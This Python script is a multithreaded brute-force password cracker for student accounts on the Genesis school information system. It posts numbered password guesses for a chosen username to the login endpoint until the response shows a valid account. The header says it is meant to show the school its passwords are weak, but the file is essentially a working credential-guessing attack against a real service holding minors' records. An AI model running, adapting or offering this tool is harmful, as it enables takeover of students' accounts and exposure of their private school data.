# Cracks passwords for genesis (https://www.genesisedu.com/) student accounts
# This is to show how easy it is for student passowrds to be cracked in a hope the school will fix this problem

from datetime import datetime
import threading
import requests
import time
import os
import re

############ VARS ############
configFile = 'config/config.confnose'
DEBUG = True
COLOR = True

ColorCodes = {'black': '30', 'red': '31', 'yellow': '33', 'green': '32', 'blue': '34',
              'cyan': '36', 'magenta': '35', 'white': '37', 'gray': '90', 'reset': '0'}

######### FUNCTIONS #########


def colored(text, color):
    if not COLOR:
        return text
    return '\033[' + ColorCodes[str(color).lower()] + 'm' + str(text) + "\033[0m"


class cfg:
    def __init__(self):
        pass

    def read(self, configfile):
        DebugPrint('Config', 'Parseing Config File', 'cyan')
        data = open(configFile, 'r').read().split('\n')
        final = {}
        for i in data:
            working = i.split('=')
            try:
                working[0] = working[0].replace(' ', '')
                working[1] = re.search(
                    r'"([A-Za-z0-9_\./\\-]*)"', working[1]).group().replace('"', '')
            except:
                pass
            if len(working[0]) >= 3 and working[0][0] != '#':
                final[working[0]] = working[1]
        DebugPrint('Config', 'Config File Parsed Successfully', 'green')
        self.configFileData = final

    def get(self, Thing):
        return self.configFileData[Thing]


def DebugPrint(Category, Text, Color):
    if not DEBUG:
        return
    print(colored('['+datetime.now().strftime("%H:%M:%S")+'] ', 'yellow') +
          colored('['+Category+'] ', 'magenta')+colored(Text, Color))


class check(threading.Thread):
    # Init Vars needed to crack passwords
    def __init__(self, thread, url, checkUrl, pWordIta, pWord, uName, timeout, startTime, startIndex, endIndex):
        threading.Thread.__init__(self)
        self.thread = thread
        self.url = url
        self.checkUrl = checkUrl
        self.pWordIta = pWordIta
        self.pWord = pWord
        self.uName = uName
        self.timeout = timeout
        self.startIndex = startIndex
        self.startTime = startTime
        self.endIndex = endIndex

    # Do the cracking :)
    def run(self):
        for i in range(self.startIndex, self.endIndex):
            # Genarate the password to try (EX: 305725)
            toTry = self.pWord + (str(i).zfill(len(str(self.pWordIta))))
            DebugPrint(
                "Crack", f'{colored("Trying", "cyan")} {colored(f"T{str(self.thread).ljust(2)}", "blue")} {colored(toTry, "green")}', "cyan")
            try:
                # Create new session to hold cookies
                ses = requests.Session()
                # Let server Create cookies needed to proform exploit (JSESSIONID)
                ses.get(self.checkUrl)
                dataToSend = {"j_password": toTry, "j_username": self.uName}
                # Try Password
                data = ses.post(self.url, timeout=self.timeout,
                                data=dataToSend)
            except:
                continue
            # Check if is correct password
            if not "Account is inactive" in data.text and not "workStudentId" in data.text:
                continue
            DebugPrint(
                "Complete", f'{colored("Password", "cyan")} {colored(f"T{str(self.thread).ljust(2)}", "blue")} {colored(f"{self.pWord}{str(i).zfill(2)}", "green")} {colored(f"[{int(time.time() - self.startTime)}]", "blue")}', "cyan")
            os._exit(0)

####### MAIN FUNCTION #######


def main():
    # Read Configvalues from the config file and assign them to vars
    DebugPrint('Main', 'Starting...', 'green')
    try:
        config = cfg()
        config.read(configFile)
        url = config.get('url').split('"')[1]
        checkUrl = config.get('checkUrl').split('"')[1]
        pWordIta = int(config.get('pWordIta'))
        uName = config.get('uName').split('"')[1]
        pWord = config.get('pWord')
        timeout = float(config.get('timeout'))
        threads = int(config.get('threads'))
        startTime = time.time()
    except:
        DebugPrint('Main', 'Problem with your Config file :/', 'red')
        os._exit(-1)

    DebugPrint(
        "Info", f'{colored("Username", "cyan")} {colored(uName, "blue")}', "cyan")

    # Create threads to check for the password
    for i in range(threads):
        startIndex = int((pWordIta/threads - 1))
        endIndex = pWordIta if i == threads - 1 else startIndex * (i + 1)
        t = check(i, url, checkUrl, pWordIta, pWord, uName,
                  timeout, startTime, startIndex * i, endIndex)
        t.daemon = True
        t.start()


if __name__ == "__main__":
    try:
        main()
        while True:
            continue
    except:
        DebugPrint('Main', 'Exiting...', 'red')
